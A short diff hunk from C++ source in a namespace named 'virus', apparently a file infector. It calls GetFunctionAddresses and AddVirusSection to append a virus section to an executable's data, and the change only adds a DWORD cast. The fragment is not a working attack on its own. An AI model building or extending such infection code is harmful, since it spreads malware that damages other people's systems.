@@ -19,7 +19,7 @@ namespace virus
         function_data.iat = &iat;
         ::GetFunctionAddresses(&function_data);
 
-        ::AddVirusSection((PVOID)&data[0], &data_size, (PVOID)&section_data[0], section_data.size(), &function_data);
+        ::AddVirusSection((PVOID)&data[0], &data_size, (PVOID)&section_data[0], (DWORD)section_data.size(), &function_data);
 
         data.resize(data_size);
 
